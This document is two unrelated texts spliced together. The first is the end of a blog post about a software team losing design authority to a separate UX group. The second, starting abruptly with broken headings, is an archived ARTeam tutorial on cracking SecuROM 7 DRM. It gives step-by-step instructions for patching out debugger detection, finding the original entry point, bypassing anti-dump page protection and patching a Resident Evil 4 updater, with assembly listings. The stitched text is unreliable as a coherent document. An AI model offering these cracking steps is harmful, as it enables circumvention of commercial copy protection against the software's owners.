some people on the team who were skilled in interface design, but I soon learned to hate it.  The problem turned out not to be with who they hired, but where.  </p><p>Instead of adding the new designers to work as part of the development team, they were hired into a separate organization I will call the “Applications Group”.</p><p>The Applications Group consisted of engineers who interacted more directly with customers, working on technical problems but not directly developing products.  It was part of an entirely separate division of the company from R&amp;D, and there were at least three levels of management one had to traverse upward before reaching a common point between this group and our R&amp;D development team.</p><p>A few weeks later we were called to a meeting with the new UX team, where they presented a pretty expansive redesign of our existing user interface, incorporating many new features and design changes.  We had a lot of questions and feedback on what was proposed, because all of it had been created without any R&amp;D input, and many things seemed difficult to implement or inadviseable for various reasons.  </p><p>Like predictable engineers, we started providing feedback during the presentation.  After several interruptions, the Applications Team presenter seemed visibly annoyed, and asked that we withhold all questions to the end so he could finish the presentation.  This is a common thing for a presenter of something to ask, and it is usually only polite to do so.  But the R&amp;D staff attending this presentation felt they were being brushed off, and doubly so when at the end of the presentation, the presenter still refused to take questions or discuss the proposal.</p><p><em>“This is preliminary,”</em><span> he said.  “</span><em>We are working on more detailed specifications, and you will have a chance to review them when they are finished</em><span>”. </span></p><p>Nothing illustrated the problem we were having here better than that statement.  It suggested that software engineers writing the code should only be permitted to review a design after it has been created, rather than to collaborate on its creation, to begin with.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fda475f4d-15af-4616-9cd5-3414cbfdec15_723x482.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fda475f4d-15af-4616-9cd5-3414cbfdec15_723x482.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fda475f4d-15af-4616-9cd5-3414cbfdec15_723x482.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fda475f4d-15af-4616-9cd5-3414cbfdec15_723x482.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fda475f4d-15af-4616-9cd5-3414cbfdec15_723x482.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fda475f4d-15af-4616-9cd5-3414cbfdec15_723x482.jpeg" width="723" height="482" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/da475f4d-15af-4616-9cd5-3414cbfdec15_723x482.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:482,&quot;width&quot;:723,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:162603,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fda475f4d-15af-4616-9cd5-3414cbfdec15_723x482.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fda475f4d-15af-4616-9cd5-3414cbfdec15_723x482.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fda475f4d-15af-4616-9cd5-3414cbfdec15_723x482.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fda475f4d-15af-4616-9cd5-3414cbfdec15_723x482.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Credit: Sabina Torres via Getty Images</figcaption></figure></div><p>As a senior member of the R&amp;D staff, I felt it was kind of my job to cause trouble about this, on our team’s behalf.  I met with the lead UX designer from the Applications Team, and pointed out to him that one’s ability to affect change once an idea has reached the review stage is severely diminished, compared to what can be done if that person is allowed to participate in the original design discussion. </p><p>He didn’t seem to feel there was a fundamental difference, or if he did, did not want to acknowledge it.  The general attitude from him and the people in his organization was that the previous R&amp;D-led design was bad, and they had been given the mandate to take charge of the product and fix it.</p><p>Some of that was true.  But their version of things seemed to preclude any kind of collaboration or input from R&amp;D during the design phase.  The “Research” of “Research and Development” evokes images of people in lab coats with test tubes. In software development terms though, the “R” would include the exploration, prototyping, and design work.  And that “R” had suddenly been removed from our job descriptions.</p><p>Various attempts of mine to convince the UX team to meet with us were rebuffed.  I eventually took it to my manager and above, because our group even within the R&amp;D organization was somewhat of a remote group, and it seemed possible to me that our main R&amp;D group was not experiencing this complete takeover of things in as quite a severe manner as our remote team had.</p><p>And indeed, our second-level management was surprised to hear how siloed things had become, and offered to speak to the manager of the UX design person and require him to have meeting with us.  While I appreciated the gesture, I told them that it probably was not going to be enough.   I likened the situation to giving a cat a bath.</p><p>Cats don’t like taking a bath.  You can force them to, but they will hate it, and try to spend the minimum amount of time they can in the water.  Then afterward, they’ll hold it against you. This was the situation with compelling the UX team to attend our meetings. That particular analogy of mine resonated with a lot of people locally and in our remote management, and thereafter the idea of forcing people to collaborate with you was referred to in these cat-bathing terms.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F471fb5c1-f97c-4131-a55f-3c038bf69928_724x482.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F471fb5c1-f97c-4131-a55f-3c038bf69928_724x482.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F471fb5c1-f97c-4131-a55f-3c038bf69928_724x482.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F471fb5c1-f97c-4131-a55f-3c038bf69928_724x482.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F471fb5c1-f97c-4131-a55f-3c038bf69928_724x482.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F471fb5c1-f97c-4131-a55f-3c038bf69928_724x482.jpeg" width="602" height="400.7790055248619" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/471fb5c1-f97c-4131-a55f-3c038bf69928_724x482.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:482,&quot;width&quot;:724,&quot;resizeWidth&quot;:602,&quot;bytes&quot;:486426,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F471fb5c1-f97c-4131-a55f-3c038bf69928_724x482.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F471fb5c1-f97c-4131-a55f-3c038bf69928_724x482.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F471fb5c1-f97c-4131-a55f-3c038bf69928_724x482.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F471fb5c1-f97c-4131-a55f-3c038bf69928_724x482.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Credit: George Pachantouris via Getty Images</figcaption></figure></div><p>Things kind of only got worse from there. In spite of our immediate R&amp;D management agreeing with our assessment of things, they were pretty powerless to fix it, because the organizational siloing was very deep (or should it be tall?) The upper-level management we shared probably was in favor of letting the Applications Group drive the R&amp;D design of things, given the very abstract level they worked at.</p><p>The people in the Applications Group took the mandate quite literally though.  As the Agile “Product Owners” of our development Sprint team, they had also assumed the responsibility for determining what would be worked on, and in what order. Normally I would say it is kind of optimal to have someone like an Applications Group person who is close to the customer setting the priority for things. But in this case, it was coupled with all the other roles the team had assumed from our development group.</p><p>As a result, almost all actual decision-making of any sort had been removed from the team, including what would be done and when.  Observing how things were going as a senior (and perhaps a bit cynical) engineer, the thought did cross my mind that this was an attempt to create a development group where no senior R&amp;D people are needed.  After all, if there are no decisions to make, and everything is already designed, it does not require a more expensive older engineer just to write code to spec.</p><p>The trouble with that theory was, the junior engineers on the team hated the organizational situation just as much, if not more, than I did.  They complained a lot about it, and espoused even more radical ideas about what management intended, and where things would end for our group.  They had no faith that they were working somewhere that valued their input or where there was a future for growth, and I was kind of surprised no one left somewhere in here.</p><p>At the lowest point, I was getting in arguments with the person prioritizing work because they objected to me scheduling R&amp;D-centric tasks like refactoring, infrastructure work, and so on without first getting permission from him.  I angrily reminded this guy that they were in charge of the Product priorities, not the R&amp;D team, but they did not see any difference I suppose.</p><p>Also on at least one occasion towards the end of all this, there was a product design meeting attended by Applications Team and UX people from various remote sites, and they chose our building to have the meeting due to its central location.  But no R&amp;D people from the building they met in were invited to these meetings, which were about the very thing R&amp;D had been asked to design. </p><p>When I called them out on it, I was told R&amp;D wasn’t invited because it would be too big a team and be “Design By Committee”.  I said it was instead “Design in an Ivory Tower”.   No compromise was ever made.  We had reached a zero-trust state, which is of course not a sustainable one for any organization.</p><p>Sounds super-crazy, even now to me.  The good news is, the company did not go out of business, the product didn’t get canceled, and nobody lost their job.  Well, almost nobody.  A few of the more arrogant players in this story either chose to leave the company, or were encouraged to choose to leave, after things came to a head and an inevitable second reorg happened.  And I would be lying if I said I was sad about it.</p><p>Things coming to a head happened because work was just not getting done on time.  Part of this could be attributed to extravagant and impractical UX designs getting too far along before they were determined to be unimplementable. Something that could be traced back again to a lack of R&amp;D and UX collaboration.</p><p><span>But a larger part of it was that people in the development team were just showing up to work, and not much else.  I had a friend once at </span><a href="https://en.wikipedia.org/wiki/Digital_Equipment_Corporation" rel="">Digital </a><span>who gave me this unforgettable advice, right after we were bought by </span><a href="https://en.wikipedia.org/wiki/Compaq" rel="">Compaq</a><span>:</span></p><p><em>“When captured by the enemy, it is best to display model prisoner behavior.”</em></p><p>And that was exactly what had happened here.  It wasn’t that people were deliberately trying to sabotage progress, they were showing up to work and doing their jobs as instructed.  But nothing more. </p><p><span>I like to use the marketing term </span><a href="https://www.investopedia.com/terms/m/mindshare.asp" rel="">“Mindshare”</a><span> to describe what you have when your employees feel empowered and are truly bought into what they are working on.  Amazing things can happen when you have a team’s Mindshare, but in this case, it was nowhere to be found.</span></p><p><span>The reorg that followed disbanded the Application group, returned the UX function back into direct R&amp;D management’s control, and integrated designers with software engineers.  It is a bit </span><a href="https://en.wikipedia.org/wiki/Deus_ex_machina" rel="">Deus Ex Machina</a><span> of an ending to the story, but I’ll take it.  Things rapidly improved after that, and so they lived happily ever after.</span></p><p>I know what you may think - this was a biased opinion in favor of R&amp;D, and there is probably a UX team side of the story.  Certainly true.  But I would say my strongest bias is not about favoring R&amp;D over some other team. </p><p>My bias is about working collaboratively, instead of in separate groups that due to their organizational distance, create opportunities for conflict and mistrust. Doesn’t matter if that organization ends up being called “R&amp;D”, or something else. Hell, we can call it Design and Development or something like that.  The nerd in me would be happy working in the D&amp;D group!</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F1ccea362-c069-4ba6-b0ba-ce933ff797ed_836x418.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F1ccea362-c069-4ba6-b0ba-ce933ff797ed_836x418.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F1ccea362-c069-4ba6-b0ba-ce933ff797ed_836x418.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F1ccea362-c069-4ba6-b0ba-ce933ff797ed_836x418.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F1ccea362-c069-4ba6-b0ba-ce933ff797ed_836x418.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F1ccea362-c069-4ba6-b0ba-ce933ff797ed_836x418.jpeg" width="836" height="418" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/1ccea362-c069-4ba6-b0ba-ce933ff797ed_836x418.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:418,&quot;width&quot;:836,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:292499,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F1ccea362-c069-4ba6-b0ba-ce933ff797ed_836x418.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F1ccea362-c069-4ba6-b0ba-ce933ff797ed_836x418.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F1ccea362-c069-4ba6-b0ba-ce933ff797ed_836x418.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F1ccea362-c069-4ba6-b0ba-ce933ff797ed_836x418.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Credit: Getty Images</figcaption></figure></div><ul><li><p><a href="https://tlo.mit.edu/learn-about-intellectual-property/patenting-invention" rel="">Patenting an Invention (MIT)</a></p></li><li><p><a href="https://be.chewy.com/how-to-bathe-a-cat-step-by-step-tips-from-a-professional-groomer/?gclid=CjwKCAiA1aiMBhAUEiwACw25MT_0cRc3HoYEd4ePW9AoVtRuVjkrJQF0BJKzo0Vs1KNdiTwAbBOaYRoCh8gQAvD_BwE" rel="">How To Bathe A Cat</a></p></li><li><p><a href="https://www.inc.com/brent-gleeson/5-ways-to-destroy-the-pesky-silos-in-your-organization.html" rel="">Breaking Silos In Your Organization</a></p></li></ul><blockquote><p><strong>Next Time</strong><span>: The experience of moving to a company with 5600X less people than the one you were at.

<p>This is an archive of an old whitepaper made by three reverse engineering experts on breaking down SecuROM and its multiple layers of protection.</p>
</blockquote>
<h2 id="Archive-Opening-Notes"><a href="#Archive-Opening-Notes" title="Archive Opening Notes"></a>Archive Opening Notes</h2><p>As mentioned, this is a whitepaper released by ARTeam in 2007/8, revealing how SecuROM 7 can be broken down using reverse engineering techniques. The tutorial is now around 10 years old, so many of the tools used are outdated or hard to find. All of the tools used in this tutorial have been added to the <a href="https://lostfilearchives.github.io/08/25/The-Index/">global index</a>, and are stored on this site.</p>
<p>This gives a very interesting look at how the technology was implemented, essentially stitching two executables together, and how to dump and remove the DRM altogether.</p>
<p>Please note that this was written by an external source, ARTeam, and formatted by yours truly for use in a blog, as well as archiving all the images and tools required.</p>

<h2 id="Foreword"><a href="#Foreword" title="Foreword"></a>Foreword</h2><p>After the publication of our first essay on SecuROM I received a lot of interest and replies on this argument, the first essay was contributed by AnonymouS and was just a bit, an insight into SecuROM, a lot of things were still missing, like fixing other anti-debugging and anti-dump methods, fixing redirections and VM. I then organized with deroko, Human and AnonymouS again to write a more complete walkthrough on SecuROM, this time covering all the required issues to successfully own it.<br>The result is this new Special Issue collecting the contributions of these authors. </p>
<p>This protector is on the scene since time began, and all the games protected with it have already been cracked then it’s time to make these things clearly public so as anyone can understand them.<br>I am also distributing the tools and scripts used in the tutorials composing this special issue. </p>
<p>Of course I want to thanks authors here for their time and their tools. SecuROM was a protection which unprotection was kept secret for a long time, now no more.</p>

Forewords"></a>1. Forewords</h3><p>It’s been a while since I did any reversing. It hasn’t been much reversing since the release of the X-Prot v2 unpacker. First of all because I’m lazy, but real life also had a lot going on. Anyway, I have been following the SecuRom thread (<a href="http://forums.accessroot.com/index.php?showtopic=4361&amp;st=0" target="_blank" rel="noopener">http://forums.accessroot.com/index.php?showtopic=4361&amp;st=0</a>) on ARTeam’s forum for a while, decided to look deeper into SecuRom 7.  </p>
<p>Initially I wanted to code an unpacker and started coding unpackers for SecuRom 7.10 through 7.12. As I began coding on an unpacker for SecuRom V7.18 I found out that the task was quite demanding so I abandoned 7.18 and moved on to 7.30.0014.</p>
<p>This small tutorial/essay is not about completely reversing SecuRom 7.30.0014. It’s just a help for people on how to reach OEP and on the way defeating the anti-debugger trick that apparently stops a lot of people. I will also show I bypass the anti-dump trick used by SecuRom.</p>
<p>The tutorial/essay is not very explaining as I do think that people reading this will be somehow more than just a newbie reverser. SecuRom is a tough protection and good reversing skills are needed in order to fully reverse this protection.    </p>

<h3 id="3-Defeating-the-mysterious-debug-detection"><a href="#3-Defeating-the-mysterious-debug-detection" title="3. Defeating the mysterious debug-detection"></a>3. Defeating the mysterious debug-detection</h3><p>Okay, let’s go to work… Run Olly, select executable and let Olly loose. We hit to exceptions before get this error message: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_2.PNG" alt="securom_backup_2"></p>
<p>In the earlier versions I used to get this whenever the ZwQueryObject trick was launched, but when I patch this I still get the error message, so I tend to think it’s the mysterious debugger detection people are talking about on the ARTeam thread. </p>
<p> How does it detect us?? We’re using HideOD and ZwQueryObject is not the reason, so this must be new debugger detection. Let’s start tracing… I will spare you for the agonizing of tracing through huge amount for checksums with SecuRom and let you straight to the answer.    </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_3.PNG" alt="securom_backup_3"></p>
<p>Notice the CMP BYTE PTR DS:[EAX+4],0 ??? It’s really a part of a much large procedure… Anyway, modify this by setting TRUE back to FALSE (1 to 0). </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_4.PNG" alt="securom_backup_4"></p>
<p>To be honest, I’m not quite sure what exactly happen, but take a look at this clean code, stripped from obfuscation, trap-flag protection and checksums: </p>
<pre><code>0577F556 FFD5             CALL EBP    &lt;-- call RtlAcquirePebLock 
056D89E3 8B45 08       MOV EAX,DWORD PTR SS:[EBP+8]  &lt;-- [EBP+8] == 30h
056D89E6 64:8B00       MOV EAX,DWORD PTR FS:[EAX]  &lt;-- Get PEB address
0577FAA2 8B40 0C       MOV EAX,DWORD PTR DS:[EAX+C]  &lt;-- PPEB_LDR_DATA
0577FDC9 8078 04 00    CMP BYTE PTR DS:[EAX+4],0  &lt;-- TRUE if debugged
0577FDD3 75 12         JNZ SHORT game.0577FDE7  &lt;-- jump bad boy 
</code></pre><p>From Microsoft’s library I came across this: </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_5.PNG" alt="securom_backup_5"></p>
<p>From what I can see the flag at [EAX+4] is somehow switched on when debugged. I tried coding a little test myself but I always came up with a TRUE result even if I was not running a debugger !?! </p>
<h3 id="4-Reaching-OEP"><a href="#4-Reaching-OEP" title="4. Reaching OEP"></a>4. Reaching OEP</h3><p>Fire up Olly and run through all exceptions, including fixing the anti-debug trick, until you reach: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_6.PNG" alt="securom_backup_6"></p>
<p>Then set a conditional BPX on VirtualProtect and run it. </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_7.PNG" alt="securom_backup_7"></p>
<p>Once Olly breaks clear BPX and suspend all threads except the main one. </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_8.PNG" alt="securom_backup_8"></p>
<p>Now set a breakpoint on ReleaseMutex and let Olly run until it breaks again. CTRL+F9 will lead you to the RETN in ReleaseMutex. Trace back into user-code and you will end up here: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_9.PNG" alt="securom_backup_9"></p>
<p>Now search for the pattern: C9 87 3C 24 </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_10.PNG" alt="securom_backup_10"></p>
<p>Be aware there are more offsets that match this pattern but the first one found should be the “good” one. If this is not the case, you better start tracing ;)  Anyway should look something like this: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_11.PNG" alt="securom_backup_11"></p>
<p>Place a Hardware breakpoint on the instruction after the LEAVE opcode and run Olly. When Olly breaks go to Memory Map and place a breakpoint code section using F2 and run Olly.  </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_12.PNG" alt="securom_backup_12"></p>
<p>Next time Olly breaks we’re at OEP. </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_13.PNG" alt="securom_backup_13"></p>
<p>Now we can dump…. Or can we ??? </p>
<h3 id="5-Defeating-the-anti-dumping-trick"><a href="#5-Defeating-the-anti-dumping-trick" title="5. Defeating the anti-dumping trick."></a>5. Defeating the anti-dumping trick.</h3><p>As one can see, reaching the OEP of SecuRom 7.30.0014 is fairly easy. However, the authors did another attempt to slow us down. When we fire up our PE-dumper we get this message: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_14.PNG" alt="securom_backup_14"></p>
<p>Hmm… What happens here ?? Our dumper won’t dump ?!? Don’t worry… This is easily defeated … Luckily for you I did all the tracing through SecuRom’s checksum hell. Let’s rewind time a little bit ;) </p>
<p>As I encountered this I decided to find out where exactly made this anti-dump trick possible. I let the executable run until the first exception and tried to dump. Here I also got the error message… So, this means that the anti-dump trick is setup before the first exception. Now I simple started the slow process of tracing through tons of checksums. First I encountered this: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_15.PNG" alt="securom_backup_15"></p>
<p>This let me to the thought that SecuRom for some strange reason GUARD PAGE the .securom section. So I set at breakpoint on VirtualProtect and after several hits I ended here: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_16.PNG" alt="securom_backup_16"></p>
<p>I then retraced my way back to the user code (CTRL-F9) and ended here: </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_17.PNG" alt="securom_backup_17"></p>
<p>Now we know what to do when reach the OEP, so let’s fast forward to the OEP and open up the Memory Map and set the access back to FULL ACCESS on the .securom section: </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_18.PNG" alt="securom_backup_18"> </p>
<p>Now we can finally dump the executable without any problems. </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_19.PNG" alt="securom_backup_19"></p>
<h3 id="6-Conclusion"><a href="#6-Conclusion" title="6. Conclusion"></a>6. Conclusion</h3><p>As one can see it is fairly easy to reach the OEP of SecuRom 7.30.0014. It’s also possible to dump the executable once we set back the page access to FULL. As for the mysterious debugger detection, we found it and is able to fix the problem. However, reaching OEP and being able to dump the executable is not enough to defeating SecuRom. The dump is filled with VM code, code-splicings etc. etc. I only showed the way to the promised land, it’s now up to you to work your way through it yourself ;)  </p>
<h3 id="7-Final-words-and-greetings"><a href="#7-Final-words-and-greetings" title="7. Final words and greetings"></a>7. Final words and greetings</h3><p>As stated in the forewords this is not a complete tutorial on how to reverse SecuRom, but merely a quick step-by-step on how to reach the OEP of version 7.30.0014. I must admit that I haven’t looked into the VM and code-splicing of this version. I initially kind of promised that I would code another unpacker but I doubt that I will ever code any again. Basically I haven’t got the time anymore and the credits you get from your many hours of work are minimal. However, if my good friend, Nacho DJ, talk me into it I might do some more tutorials ;) </p>
<p>Last but not least I would like to send out my greetings to: </p>

<h3 id="2-First-step-start-of-journey"><a href="#2-First-step-start-of-journey" title="2. First step: start of journey"></a>2. First step: start of journey</h3><p>Lets start with installing game. </p>
<h3 id="3-Second-step-prepare-things"><a href="#3-Second-step-prepare-things" title="3. Second step: prepare things"></a>3. Second step: prepare things</h3><p>Install patch(if you have biohazard you still can install patch after some steps) </p>
<p>First insert Reg file with path to your biohazard 4 </p>
<pre><code>REGEDIT4 [HKEY_LOCAL_MACHINE\SOFTWARE\CAPCOM\resident evil 4] "PATH"="e:\\Games\\biohazard 4\\" 
</code></pre><p>Next lets load patch into ollydbg and patch its complain about no game to update :P </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_20.PNG" alt="securom_backup_20"></p>
<p>You see 00407E4B change it to JMP SHORT upd_pal1.00407EAB and patch will start patching us to 1.1 and securom protected (well it takes a while) </p>
<p> <img src="https://lostfilearchives.github.io/coldstorage/securom_backup_21.PNG" alt="securom_backup_21"></p>
<h3 id="4-Third-Step-Load-the-game-into-Olly-and-rebase"><a href="#4-Third-Step-Load-the-game-into-Olly-and-rebase" title="4. Third Step: Load the game into Olly and rebase"></a>4. Third Step: Load the game into Olly and rebase</h3><p>Lets load game.exe into olly. Press alt+M to see memory.<br>As you can see d3dx9_30.dll blocks our dump to have linear regions :( </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_22.PNG" alt="securom_backup_22"> </p>
<p>So we have to use rebaser from Dr.Golova to fix it to our needs (dont worry All Works after it) rebase it to 20000000h </p>
<p><img src="https://lostfilearchives.github.io/coldstorage/securom_backup_23.PNG" alt="securom_backup_23"> </p>
<p>Lets reload game.exe and voila All is fine All range after exe till 20000000h is free:) </p>
